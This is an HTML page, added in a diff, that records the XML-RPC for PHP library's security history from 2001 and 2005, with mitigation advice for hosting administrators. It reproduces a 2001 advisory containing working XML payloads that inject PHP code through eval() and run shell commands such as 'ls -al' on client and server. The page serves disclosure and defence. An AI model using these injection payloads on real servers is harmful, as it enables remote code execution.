@@ -1,0 +1,256 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+        "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>XML-RPC for PHP Security Infos</title>
+    <link rel="icon" type="image/vnd.microsoft.icon" href="favicon.ico" />
+    <link rel="stylesheet" type="text/css" href="xmlrpc.css" />
+</head>
+<body>
+<h1>XML-RPC for PHP Security Infos</h1>
+<div id="menu">
+<a href="index.html#news">News</a> |
+<a href="index.html#download">Download</a> |
+<a href="index.html#features">Features</a> |
+<a href="index.html#requirements">Requirements</a> |
+<a href="index.html#interest">Documentation</a> |
+<a href="index.html#demoserver">Online demo server</a> |
+<a href="index.html#debugger">Online xmlrpc debugger</a> |
+<a href="index.html#development">Development</a> |
+<a href="index.html#roadmap">Roadmap</a> |
+<a href="index.html#history">History</a> |
+<a href="index.html#mailinglists">Mailing lists</a> |
+<a href="index.html#contact">Contact</a> |
+Security
+</div>
+<div id="content">
+
+    <p>
+    The following is the list of all known security problems in the history of the library.
+    </p>
+
+    <div class="incident">
+        <h3>The third security breach: august 2005</h3>
+        <p>This was a further and proactive response to the second security breach below.  All use of eval() has been removed since it was still a potential exploit.</p>
+        <p>When the library was originally written, the versions of php available at the time did not include call_user_func(), et al.  So it was written within those constraints to use eval() in two of the functions called by the xml parser.  Due to this usage, the server class also used eval() since it had to parse xml using the same functions.</p>
+        <p>These handler functions, and the array used to maintain the content of the original message, have been rewritten to construct php values instead of building php code for evaluation.  This should remove any potential for code execution.</p>
+    </div>
+
+    <div class="incident">
+        <h3>The second security breach: july 2005</h3>
+        <p>The security vulnerability discovered by James Bercegay of GulfTech Security Research on the the 27th of June, 2005, has caused quite a stir. It has made it to the front page of Salshdot, has been mentioned on Netcraft, LWN and many other sites.</p>
+        <p>Detailed instructions on building exploit code have been released on the internet, and many web hosting administrators are left wondering what is the best defense plan, and what are the real risks. Here are some answers.</p>
+
+        <h3>Scope of the problem</h3>
+        <ul>
+            <li>the bug affects the two libraries known as PEAR::XMLRPC and PHPXMLRMPC.<br/>It DOES NOT affect the xmlrpc implementation which is built-in in php and enabled at compile time with the "--with-xmlrpc" option (on Unix, on windows generally it is enabled/disabled by changing the appropriate line in php.ini)</li>
+            <li>the bug (execution of php-code injected by remote hosts) resides exclusively in the file <b>xmlrpc.inc</b> in the phpxmlrpc distribution and <b>RPC.php</b> in the PEAR distribution</li>
+            <li>both PEAR::XMLRPC and PHPXMLRMPC have released updated versions of the library that fix the problem</li>
+            <li>both libraries have been used in a large number of php applications (see the incomplete list above).<br/>
+                Since the whole lib consists basically of 2 very simple files, everybody tends to patch them according to its own tastes/needs and bundle them when distributing their app.<br/>
+                Most high-profile projects have been extremely quick in releasing new versions of their respective apps, but it will take a much longer time for every single user to update his system.<br/>
+                It has to be said that many applications had been shipping until recently with extremely outdated versions of the phpxmlrpc library included; <a>a first injection bug had been fixed in 2001</a> without anyone apparently taking notice (...)<br/><br/>
+                This makes it unfortunately a lot harder for sysadmins to find an easy cure for the problem: there is a great chance that on public hosting servers the aforementioned files will be found in many different directories and in many different versions.</li>
+        </ul>
+        <h3>How the vulnerability is triggered</h3>
+        <ul>
+            <li>to trigger the bug an attacker needs to have some specially crafted xml evaluated in the creation process of an xmlrpcval object. Xmlrpcval objects are created when the server script decodes xmlrpc requests or when some php scripts acts as an xmlrpc client and decodes a response sent by a server.<br/>
+                The server script is application specific, and it is often named server.php (but any project- or user-chosen variant is possible), and it has to include both xmlrpc.inc and xmlrpcs.inc files (for the pear version, server.php is the equivalent of xmlrpcs.inc).</li>
+            <li>Only including xmlrpc.inc and xmlrpcs.inc in php scripts is (afaik...) completely safe, as well as calling them directly via http requests, since only definition of functions, variables and classes is carried out in those two files, i.e. no immediate code execution.</li>
+            <li>The server.php and discuss.php files distributed with full the phpxmlrpc lib actually do implement a live xmlrpc server, so you might consider blocking access to them or even better removing them if you find them deployed on production servers (off the top of my mind I can conjure some kind of attack involving a second php app suffering of a takeover-php-file-inclusion breach to pull them in + exploit the lib known bug)</li>
+        </ul>
+        <h3>Means of protection</h3>
+        <ul>
+            <li>Give your web server process as little system privileges as you can. On Unix this generally involves running Apache as user nobody and/or in a jailrooted/chrooted environment. Since the PHP engine runs under the same user as the web server, this is the first line of defense: any php code injected by an attacker will run on the server as a least privileged user, and all damage it could do will be limited to disrupting the php application itself</li>
+            <li>Run php in safe mode. If you are a public host and are not doing this, chances are your server has been rooted anyway. This prevents the php scripts from using any function you deem to be unsafe, such as system() or eval()</li>
+            <li><span class="evidence">The hard block:</span> find all the existing phpxmlrpc files (xmlrpc.inc and xmlrpcs.inc) and disable them (chmod 0) across the system.<br/>
+                This may of course prevent some user applications from working so you should inform your users at the time you do it.</li>
+            <li><span class="evidence">The soft block:</span> replace all copies of existing phpxmlrpc files (xmlrpc.inc and xmlrpcs.inc) with the ones coming from version 1.1.1.<br/>
+                This method is unfortunately not 100% guaranteed to keep all apps working. Some internals of the lib objects changed from version 0.9 to 1.0 to 1.1 (e.g. the representation of http headers stored inside an xmlrpcresp object), and if code you have deployed on your servers subclasses them, it might find itself in trouble. The xml sent over-the-wire has changed too with respect to some older versions of the lib (in particular: version 1.0.99.2 wrongly encoded chars outside the ASCII range as html entities, whereas now they are encoded as xml charset entities). A couple of new error response codes have been added, too. Having said that, you should be 95% safe running that script and sit there waiting for users to start yelling something is broken...</li>
+            <li>the PHP PEAR library is upgradeable  with a one-line command, so that's not really a huge problem:<br/>
+                <pre>pear upgrade XML_RPC</pre>
+                and to tell whether it's been upgraded (1.3.1 or later is OK, the latest as of now is 1.3.2):<br/>
+                <pre>pear list | grep RPC</pre></li>
+        </ul>
+        <h3>Some extra considerations</h3>
+        The file xmlrpcs.inc has been patched too in release 1.1.1 to provide a better user experience. In more detail: sending specially crafted malformed xml to a server would cause the php script to emit a php error instead of returning an appropriate xml response.<br/>
+        According to some, this actually entails a "path disclosure security breach" (i.e. the php error message displayed usually contains sensitive information about filesystem paths), but then any single PHP script suffers of the same security problem if the sysadmin is running production servers with the ini directive display_errors=On.<br/>
+        I also know for a fact that there are many places in xmlrpc.inc where calling a function with an unexpected parameter will generate a php warning or error, and I am not planning to implement strict parameter check for every single function anytime soon - if you aim for that, imho, you might as well code in java in the first place.
+        <h3>Is this the end of the world?</h3>
+        I hope not.<br/>
+        The reason is there are tens of PHP applications out there that suffer from code injection exploits. Just take a look at the security track of bulletin boards... and yet a lot of people still think PHP is a good choice for web development.<br/>
+        Remember: security is a process, not a state that can be reached.<br/><br/>
+        Gaetano Giunta
+    </div>
+
+    <div class="incident">
+        <h3>The first security breach: september 2001</h3>
+        <pre>
+I received this advisory from Dan Libby. With his
+permission it is reproduced here.  Note that this exploit is fixed
+in revisions 1.01 and greater of XML-RPC for PHP.
+
+ -- Edd Dumbill
+
+Tue Sep 24 2001
+===============
+
+PHP Security Hole: potential XML-RPC exploit
+============================================
+
+Abstract:
+
+Using the latest release of Useful Inc's php xmlrpc library, version 1.0,
+it is possible for an attacker to structure the xml in such a way as to
+trick the xml-rpc library into executing php code on a web server.  I
+was able to execute arbitrary php code, and with php's safe-mode turned
+off, system commands.  An attacker could easily use this as a gateway for
+launching viruses.
+
+Details:
+
+I demonstrated the problem by modifying the server.php example script
+included with the xmlrpc distribution and then calling it via the
+client.php script, also part of the distribution. I bypassed the standard
+server code, and simply echo'd responses back to the client. I was
+able to get the client to execute arbitrary php code. I then restored the
+server.php sample to its original state and used telnet to send a modified
+request. I was also able to make code execute on the server, albeit requiring
+a slightly different syntax.
+
+The attack centers around use of php's eval() function. Since I knew that
+the xml-rpc library uses eval to construct its data structures from xml
+input, it was just a matter of structuring the input xml in such a
+manner that it:
+
+a) is not escaped before being passed to eval
+b) does not generate a php syntax error
+
+Normally, all non numeric data is escaped by the library before being
+passed to eval.  However, it turns out that if you send a &lt;value&gt; tag,
+followed by an unexpected tag, such as &lt;foo&gt;, the escaping code will be
+bypassed and "raw" data will be evaluated instead.
+
+Exploiting the client:
+
+Here is a typical xml-rpc response:
+
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+&lt;params&gt;&lt;param&gt;
+
+&lt;value&gt;&lt;string&gt;hello world&lt;/string&gt;&lt;/value&gt;
+
+&lt;/param&gt;&lt;/params&gt;
+&lt;/methodResponse&gt;
+
+When such a response is eval'ed, it looks like:
+
+new xmlrpcval("hello world", "string")
+
+Here is an xml-rpc response that will execute php code to echo "&lt;h1&gt; hello
+world &lt;/h1&gt;" on the client side:
+
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+&lt;params&gt;&lt;param&gt;
+
+&lt;value&gt;&lt;foo&gt;", "string"); echo "&lt;h1&gt; hello world &lt;/h1&gt;"; \$waste = array("&lt;/foo&gt;&lt;/value&gt;
+
+&lt;/param&gt;&lt;/params&gt;
+&lt;/methodResponse&gt;
+
+In this case, the string that will be eval'ed is:
+
+new xmlrpcval("", "string"); echo "&lt;h1&gt; hello world &lt;/h1&gt;"; $waste = array("", 'string')
+
+It is possible to replace everything between "string"); and \$waste with
+arbitrary code of just about any length.
+
+Finally, here's one that will print the contents of the current directory:
+
+&lt;?xml version="1.0"?&gt;
+&lt;methodResponse&gt;
+&lt;params&gt;
+&lt;param&gt;
+&lt;value&gt;&lt;foo&gt;&#34;, "string");
+
+echo "&lt;h1&gt;&lt;font color=red&gt;if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font&gt;&lt;/h1&gt;";
+echo "now I will attempt a directory listing using ls -al:\n&lt;xmp&gt;"; echo `ls -al`; echo "&lt;/xmp&gt;";
+echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus)
+ or read some files. Have a nice day.&lt;br&gt;&lt;br&gt;";
+exit;
+
+\$waste = array("&lt;/foo&gt;&lt;/value&gt;
+&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodResponse&gt;
+
+Exploiting the server:
+
+The server exploit is just about the same as the client, except that the
+server is using a different eval command, and thus it requires slightly
+different begin and ending syntax to avoid php syntax errors.
+
+Here is the same code as above, but it will work against a server.
+
+&lt;?xml version='1.0' encoding="iso-8859-1" ?&gt;
+&lt;methodCall&gt;
+&lt;methodName&gt;system.listMethods&lt;/methodName&gt;
+&lt;params&gt;
+&lt;param&gt;
+&lt;value&gt;&lt;test&gt;&#34;, "string"));
+
+echo "&lt;h1&gt;&lt;font color=red&gt;if you see a directory listing, I just executed php and system code via xml-rpc.&lt;/font&gt;&lt;/h1&gt;";
+echo "now I will attempt a directory listing using ls -al:\n&lt;xmp&gt;"; echo `ls -al`; echo "&lt;/xmp&gt;";
+
+echo "I could just have easily invoked rm -rf, or written a program to disk and executed it (eg, a virus)
+ or read some files. Have a nice day.&lt;br&gt;&lt;br&gt;";
+exit;
+
+$waste = array(array("&lt;/test&gt;&lt;/value&gt;
+&lt;/param&gt;
+&lt;/params&gt;
+&lt;/methodCall&gt;
+
+Problem Area:
+
+in xmlrpc.inc, there is a function called xmlrpc_cd(), which is called by
+the xml parser to handle character data.
+
+function xmlrpc_cd($parser, $data) {
+   global $_xh, $xmlrpc_backslash, $xmlrpc_twoslash;
+
+//if (ereg("^[\n\r \t]+$", $data)) return;
+// print "adding [${data}]\n";
+   if ($_xh[$parser]['lv']==1) {
+      $_xh[$parser]['qt']=1;
+      $_xh[$parser]['lv']=2;
+   }
+   if ($_xh[$parser]['qt']) { // quoted string
+      $_xh[$parser]['ac'].=str_replace('\$', '\\$',
+                                       str_replace('"', '\"',
+                                                   str_replace(chr(92),$xmlrpc_backslash, $data)));
+   }
+   else
+      $_xh[$parser]['ac'].=$data;
+}
+
+It is the last else that is causing data to be added without escaping.  It
+is very dangerous to have this. This else seems to be intended for
+numeric data, and great pains are taken to set and unset the "qt" (quote)
+variable which turns escaping on and off. However, it is not immediately
+apparent to me why numeric data should not be similarly escaped, and the
+if/else removed, such that there is zero chance for this type of exploit.
+        </pre>
+    </div>
+
+    <hr/>
+    <a href="http://validator.w3.org/check?uri=https%3A%2F%2Fgggeek.github.io%2Fphpxmlrpc%2Fsecurity.html"><img
+            src="http://www.w3.org/Icons/valid-xhtml10" height="31" width="88"
+            alt="Valid XHTML 1.0!" /></a><br/>
+    Page last updated: 2021/12/12
+
+</div>
+</body>
